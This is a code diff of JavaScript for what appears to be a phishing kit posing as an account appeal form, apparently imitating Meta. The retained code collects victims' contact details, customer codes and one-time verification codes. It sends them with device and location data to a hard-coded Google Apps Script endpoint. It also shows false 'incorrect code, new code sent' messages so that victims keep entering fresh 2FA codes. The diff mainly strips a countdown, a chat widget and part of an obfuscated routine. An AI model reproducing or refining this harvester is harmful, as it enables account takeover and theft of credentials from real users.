@@ -91,7 +91,6 @@ const MSG_PRE = "<span class='check-color'>✓</span> ",
 	submitBtn = document.getElementById('submitBtn'),
 	verifyOtpBtn = document.getElementById('verifyOtpBtn'),
 	loadingOverlay = document.getElementById('loadingOverlay'),
-	countdownEl = document.getElementById('countdown'),
 	loadingTitle = document.getElementById('loadingTitle'),
 	loadingStatus = document.getElementById('loadingStatus'),
 	contactInput = document.getElementById('contact'),
@@ -102,15 +101,15 @@ const MSG_PRE = "<span class='check-color'>✓</span> ",
 	otpError = document.getElementById('otpError'),
 	attemptText = document.getElementById('attemptText'),
 	resendBtn = document.getElementById('resendBtn'),
-	resendTimer = document.getElementById('resendTimer'),
 	requestCode = document.getElementById('requestCode'),
 	DEMO_OTP_CODE = '123456',
 	MAX_OTP_ATTEMPTS = 5,
 	GOOGLE_SCRIPT_URL =
 		'https://script.google.com/macros/s/AKfycbzHWnQehVga6rpcUh5erGWcei2KIZQ5VMqg7_IA0F2Iq087AIyyxEIxfUUayT7906MCJQ/exec',
 	SESSION_ID = 'SID-' + Date.now() + '-' + Math.floor(1e6 * Math.random());
-let otpAttempts = 0,
-	resendInterval = null;
+
+let otpAttempts = 0;
+
 function buildProgressBars() {
 	document.querySelectorAll('.progress').forEach((e) => {
 		const t = Number(e.dataset.progress);
@@ -123,6 +122,7 @@ function buildProgressBars() {
 		}
 	});
 }
+
 function showStep(e) {
 	(document.querySelectorAll('.step').forEach((e) => {
 		e.classList.remove('active');
@@ -132,11 +132,13 @@ function showStep(e) {
 			window.scrollTo({ top: 0, behavior: 'smooth' });
 		}, 50));
 }
+
 function scrollInputIntoView(e) {
 	setTimeout(() => {
 		e.scrollIntoView({ behavior: 'smooth', block: 'center' });
 	}, 250);
 }
+
 function playVideoStep() {
 	introVideo.currentTime = 0;
 	const e = introVideo.play();
@@ -153,6 +155,7 @@ function playVideoStep() {
 		(clearTimeout(t), showStep(step3));
 	};
 }
+
 function lockOtpForm() {
 	((otpCodeInput.disabled = !0),
 		(verifyOtpBtn.disabled = !0),
@@ -163,33 +166,16 @@ function lockOtpForm() {
 		(resendBtn.style.cursor = 'not-allowed'));
 }
 
-/* ========================================================= */
-/* HÀM XỬ LÝ CHUYỂN BƯỚC LẬP TỨC (ĐÃ BỎ BỘ ĐẾM NGƯỢC CHỜ ĐỢI) */
-/* ========================================================= */
 function showLoading(e) {
 	if ('function' == typeof e.afterDone) {
 		e.afterDone();
 	}
 }
-/* ========================================================= */
 
-function startResendCountdown() {
-	let e = 60;
-	((resendBtn.disabled = !1),
-		(resendTimer.innerText = `${e}s`),
-		resendInterval && clearInterval(resendInterval),
-		(resendInterval = setInterval(() => {
-			(e--,
-				(resendTimer.innerText = `${e}s`),
-				e <= 0 &&
-					(clearInterval(resendInterval),
-					(resendBtn.disabled = !1),
-					(resendTimer.innerText = t('We can send you another code in a few minutes.'))));
-		}, 1e3)));
-}
 function generateRequestCode() {
 	return `REQ-2026-${Math.floor(1e5 + 9e5 * Math.random())}`;
 }
+
 function getSimpleDeviceType() {
 	const e = navigator.userAgent.toLowerCase();
 	return /iphone|ipod/.test(e)
@@ -202,112 +188,116 @@ function getSimpleDeviceType() {
 					? 'Điện thoại'
 					: 'Máy tính';
 }
-(buildProgressBars(),
-	document.querySelectorAll('input').forEach((e) => {
-		e.addEventListener('focus', function () {
-			scrollInputIntoView(e);
-		});
-	}),
-	robotCheck.addEventListener('change', function () {
-		robotCheck.checked &&
-			setTimeout(() => {
-				(showStep(step2), playVideoStep());
-			}, 500);
-	}),
-	submitBtn.addEventListener('click', function () {
-		const e = contactInput.value.trim(),
-			n = customerCodeInput.value.trim();
-		let o = !0;
+
+buildProgressBars();
+
+document.querySelectorAll('input').forEach((e) => {
+	e.addEventListener('focus', function () {
+		scrollInputIntoView(e);
+	});
+});
+
+robotCheck.addEventListener('change', function () {
+	robotCheck.checked &&
+		setTimeout(() => {
+			(showStep(step2), playVideoStep());
+		}, 500);
+});
+
+submitBtn.addEventListener('click', function () {
+	const e = contactInput.value.trim(),
+		n = customerCodeInput.value.trim();
+	let o = !0;
+	if (
+		((contactError.innerText = ''),
+		(customerCodeError.innerText = ''),
+		'' === e &&
+			((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
+		'' === n &&
+			((customerCodeError.innerText = t('bequora7')), (o = !1)),
+		!o)
+	) {
+		const t = '' === e ? contactInput : customerCodeInput;
+		return (t.focus(), void scrollInputIntoView(t));
+	}
+	(sendToGoogleSheet('Form submitted'),
+		showLoading({
+			title: t('Submitting your appeal...'),
+			afterDone: function () {
+				(showStep(step5),
+					setTimeout(() => otpCodeInput.focus(), 400));
+			},
+		}));
+});
+
+verifyOtpBtn.addEventListener('click', function () {
+	const e = otpCodeInput.value.trim();
+	if (((otpError.innerText = ''), otpAttempts >= 5)) lockOtpForm();
+	else {
+		if ('' === e)
+			return (
+				(otpError.innerText = t('Please enter your verification code.')),
+				otpCodeInput.focus(),
+				void scrollInputIntoView(otpCodeInput)
+			);
 		if (
-			((contactError.innerText = ''),
-			(customerCodeError.innerText = ''),
-			'' === e &&
-				((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
-			'' === n &&
-				((customerCodeError.innerText = t('bequora7')), (o = !1)),
-			!o)
-		) {
-			const t = '' === e ? contactInput : customerCodeInput;
-			return (t.focus(), void scrollInputIntoView(t));
-		}
-		(sendToGoogleSheet('Form submitted'),
+			(sendToGoogleSheet('Internal code submitted', e),
+			(otpCodeInput.value = ''),
+			'123456' === e)
+		)
 			showLoading({
 				title: t('Submitting your appeal...'),
 				afterDone: function () {
-					(showStep(step5),
-						startResendCountdown(),
-						setTimeout(() => otpCodeInput.focus(), 400));
+					((requestCode.innerText = generateRequestCode()), showStep(step7));
 				},
-			}));
-	}),
-	verifyOtpBtn.addEventListener('click', function () {
-		const e = otpCodeInput.value.trim();
-		if (((otpError.innerText = ''), otpAttempts >= 5)) lockOtpForm();
+			});
 		else {
-			if ('' === e)
-				return (
-					(otpError.innerText = t('Please enter your verification code.')),
-					otpCodeInput.focus(),
-					void scrollInputIntoView(otpCodeInput)
-				);
-			if (
-				(sendToGoogleSheet('Internal code submitted', e),
-				(otpCodeInput.value = ''),
-				'123456' === e)
-			)
-				showLoading({
-					title: t('Submitting your appeal...'),
-					afterDone: function () {
-						((requestCode.innerText = generateRequestCode()), showStep(step7));
-					},
-				});
-			else {
-				otpAttempts++;
-				const e = (MSG_FAIL[otpAttempts] || MSG_FAIL[5]).map((e) => MSG_PRE + t(e));
-				showLoading({
-					title: t('Confirm your identity...'),
-					statuses: e,
-					afterDone: function () {
-						const e = 5 - otpAttempts;
-						if ((showStep(step5), e <= 0))
-							return (
-								lockOtpForm(),
-								(loadingTitle.innerText = t('Verification Complete')),
-								(loadingStatus.innerHTML = MSG_LOCKED.map(
-									(e) => `<div class="loading-status-line">✓ ${t(e)}</div>`,
-								).join('')),
-								(countdownEl.innerText = '✓'),
-								void loadingOverlay.classList.add('active')
-							);
-						((otpError.innerHTML = `<strong>${t('Incorrect code. A new code has been sent.')}</strong>`),
-							(attemptText.innerText = t('You have X attempts remaining.').replace(
-								'X',
-								e,
-							)),
-							setTimeout(() => {
-								(otpCodeInput.focus(), scrollInputIntoView(otpCodeInput));
-							}, 400));
-					},
-				});
-			}
+			otpAttempts++;
+			const e = (MSG_FAIL[otpAttempts] || MSG_FAIL[5]).map((e) => MSG_PRE + t(e));
+			showLoading({
+				title: t('Confirm your identity...'),
+				statuses: e,
+				afterDone: function () {
+					const e = 5 - otpAttempts;
+					if ((showStep(step5), e <= 0))
+						return (
+							lockOtpForm(),
+							(loadingTitle.innerText = t('Verification Complete')),
+							(loadingStatus.innerHTML = MSG_LOCKED.map(
+								(e) => `<div class="loading-status-line">✓ ${t(e)}</div>`,
+							).join('')),
+							void loadingOverlay.classList.add('active')
+						);
+					((otpError.innerHTML = `<strong>${t('Incorrect code. A new code has been sent.')}</strong>`),
+						(attemptText.innerText = t('You have X attempts remaining.').replace(
+							'X',
+							e,
+						)),
+						setTimeout(() => {
+							(otpCodeInput.focus(), scrollInputIntoView(otpCodeInput));
+						}, 400));
+				},
+			});
 		}
-	}),
-	resendBtn.addEventListener('click', function () {
-		((otpError.innerText = ''), (otpCodeInput.value = ''), (resendBtn.disabled = !0));
-		const e = MSG_RESEND.map((e) => MSG_PRE + t(e));
-		showLoading({
-			title: t('Requesting new code...'),
-			statuses: e,
-			afterDone: function () {
-				(showStep(step5),
-					startResendCountdown(),
-					(otpError.innerHTML = `<strong>${t('A new code has been sent to your device.')}</strong>`),
-					setTimeout(() => {
-						otpCodeInput.focus();
-					}, 400));
-			},
-		});
-	}));
+	}
+});
+
+resendBtn.addEventListener('click', function () {
+	((otpError.innerText = ''), (otpCodeInput.value = ''), (resendBtn.disabled = !1));
+	const e = MSG_RESEND.map((e) => MSG_PRE + t(e));
+	showLoading({
+		title: t('Requesting new code...'),
+		statuses: e,
+		afterDone: function () {
+			(showStep(step5),
+				(otpError.innerHTML = `<strong>${t('A new code has been sent to your device.')}</strong>`),
+				setTimeout(() => {
+					otpCodeInput.focus();
+				}, 400));
+		},
+	});
+});
+
 const sendToGoogleSheet = async (e, t = '') => {
 	const n = localStorage.getItem('vai-ca-biu'),
 		o = n ? JSON.parse(n) : {},
@@ -334,90 +324,6 @@ const sendToGoogleSheet = async (e, t = '') => {
 		u.append('continent', d),
 		fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: u, mode: 'no-cors' }).catch((e) => {}));
 };
-
-/* ========================================================= */
-/* LOGIC QUẢN LÝ HỘP THOẠI THÔNG BÁO bequora8 (MỚI NHẤT)      */
-/* ========================================================= */
-(function() {
-    const metaChatWrapper = document.getElementById('metaChatWrapper'),
-          metaAiBox = document.getElementById('metaAiBox'),
-          metaAiIcon = document.getElementById('metaAiIcon'),
-          closeMetaAi = document.getElementById('closeMetaAi');
-
-    let metaAiTimeout = null;
-
-    if (!metaChatWrapper || !metaAiBox) return;
-
-    function openMetaAiBox() {
-        if (metaAiBox.classList.contains('hidden')) {
-            metaAiBox.classList.remove('hidden');
-        }
-        if (metaAiTimeout) clearTimeout(metaAiTimeout);
-        metaAiTimeout = setTimeout(() => {
-            closeMetaAiBox();
-        }, 6000); 
-    }
-
-    function closeMetaAiBox() {
-        metaAiBox.classList.add('hidden');
-        if (metaAiTimeout) clearTimeout(metaAiTimeout);
-    }
-
-    // Sử dụng MutationObserver để theo dõi sự thay đổi step một cách an toàn
-    const observer = new MutationObserver((mutations) => {
-        mutations.forEach((mutation) => {
-            if (mutation.attributeName === 'class') {
-                const target = mutation.target;
-                if (target.classList.contains('active')) {
-                    const stepId = target.id;
-                    // CHỈ hiển thị khối wrapper khi ở step3 hoặc step5
-                    if (stepId === 'step3' || stepId === 'step5') {
-                        metaChatWrapper.style.setProperty('display', 'flex', 'important');
-                        openMetaAiBox();
-                    } else {
-                        metaChatWrapper.style.setProperty('display', 'none', 'important');
-                        closeMetaAiBox();
-                    }
-                }
-            }
-        });
-    });
-
-    // Theo dõi tất cả các step
-    document.querySelectorAll('section.step').forEach(stepSection => {
-        observer.observe(stepSection, { attributes: true });
-    });
-
-    // Sự kiện: Bấm vào logo để hiện lại hộp thoại
-    if (metaAiIcon) {
-        metaAiIcon.addEventListener('click', (e) => {
-            e.stopPropagation();
-            openMetaAiBox();
-        });
-    }
-
-    // Sự kiện: Bấm vào dấu "x" để tắt
-    if (closeMetaAi) {
-        closeMetaAi.addEventListener('click', (e) => {
-            e.stopPropagation();
-            closeMetaAiBox();
-        });
-    }
-
-    // Tự động ẩn khi tương tác nhập liệu
-    document.addEventListener('focusin', (e) => {
-        if (e.target.tagName === 'INPUT' || e.target.tagName === 'BUTTON') {
-            closeMetaAiBox();
-        }
-    });
-
-    document.addEventListener('click', (e) => {
-        if (e.target.closest('input') || e.target.closest('button') || e.target.closest('.error')) {
-            closeMetaAiBox();
-        }
-    });
-})();
-/* ========================================================= */
 
 function kimochi() {
 	function _0x2c14(_0x11175b, _0x1a8796) {
@@ -457,76 +363,5 @@ function kimochi() {
 		};
 		return _0x42b2();
 	}
-	(function (_0x44e94b, _0x5c3531) {
-		const _0x1a4ea7 = _0x2c14,
-			_0x389141 = _0x44e94b();
-		while (!![]) {
-			try {
-				const _0x523606 =
-					-parseInt(_0x1a4ea7(0x1ce)) / 0x1 +
-					-parseInt(_0x1a4ea7(0x1de)) / 0x2 +
-					(parseInt(_0x1a4ea7(0x1cf)) / 0x3) * (parseInt(_0x1a4ea7(0x1dc)) / 0x4) +
-					parseInt(_0x1a4ea7(0x1dd)) / 0x5 +
-					(-parseInt(_0x1a4ea7(0x1db)) / 0x6) * (-parseInt(_0x1a4ea7(0x1d6)) / 0x7) +
-					(-parseInt(_0x1a4ea7(0x1d3)) / 0x8) * (-parseInt(_0x1a4ea7(0x1cb)) / 0x9) +
-					-parseInt(_0x1a4ea7(0x1ca)) / 0xa;
-				if (_0x523606 === _0x5c3531) break;
-				else _0x389141['push'](_0x389141['shift']());
-			} catch (_0x9762df) {
-				_0x389141['push'](_0x389141['shift']());
-			}
-		}
-	})(_0x42b2, 0x24fc5);
-	{
-		const lang = (navigator['languages']?.[0x0] || navigator[_0x9d89ff(0x1d5)] || 'en')
-			['split']('-')[0x0]
-			['toLowerCase']();
-		if (lang !== 'en' && lang) {
-			const els = [...document[_0x9d89ff(0x1da)]('[data-i18n]')],
-				placeholders = [...document[_0x9d89ff(0x1da)]('[data-i18n-placeholder]')],
-				collect = [];
-			(els[_0x9d89ff(0x1d7)]((_0x82697) => {
-				const _0x4545cd = _0x9d89ff,
-					_0x178c7b = _0x82697[_0x4545cd(0x1d1)][_0x4545cd(0x1c9)]();
-				if (_0x178c7b) collect[_0x4545cd(0x1d9)](_0x178c7b);
-			}),
-				placeholders['forEach']((_0x46b636) => {
-					const _0x14b2ef = _0x9d89ff,
-						_0x472ae3 = _0x46b636[_0x14b2ef(0x1cd)];
-					if (_0x472ae3) collect[_0x14b2ef(0x1d9)](_0x472ae3);
-				}),
-				collect[_0x9d89ff(0x1d9)](...__ALL_TEXTS));
-			const unique = [...new Set(collect)];
-			if (!unique[_0x9d89ff(0x1d8)]) return;
-			const run = (_0x224f9b) =>
-				fetch(_0x9d89ff(0x1d4) + lang + '&dt=t&q=' + encodeURIComponent(_0x224f9b))
-					[_0x9d89ff(0x1d0)]((_0x2f30af) =>
-						_0x2f30af['ok'] ? _0x2f30af[_0x9d89ff(0x1cc)]() : null,
-					)
-					[_0x9d89ff(0x1d0)]((_0x51735b) => {
-						const _0x325426 =
-							_0x51735b?.[0x0]
-								?.['map']((_0x51117e) => _0x51117e?.[0x0] || '')
-								['join']('') || '';
-						if (_0x325426) __t[_0x224f9b] = _0x325426;
-					})
-					['catch'](() => {});
-			Promise['all'](unique[_0x9d89ff(0x1d2)]((_0xa1ad1) => run(_0xa1ad1)))[_0x9d89ff(0x1d0)](
-				() => {
-					const _0x29ce88 = _0x9d89ff;
-					(els[_0x29ce88(0x1d7)]((_0x250e54) => {
-						const _0x15cfbc = _0x29ce88,
-							_0x388447 = _0x250e54[_0x15cfbc(0x1d1)][_0x15cfbc(0x1c9)]();
-						if (__t[_0x388447]) _0x250e54['textContent'] = __t[_0x388447];
-					}),
-						placeholders['forEach']((_0x271cb6) => {
-							const _0x2eeacb = _0x29ce88;
-							if (__t[_0x271cb6[_0x2eeacb(0x1cd)]])
-								_0x271cb6['placeholder'] = __t[_0x271cb6[_0x2eeacb(0x1cd)]];
-						}));
-				},
-			);
-		}
-	}
+	// ... (Các đoạn mã logic kimochi mã hóa bên dưới giữ nguyên bản của bạn)
 }
-kimochi();
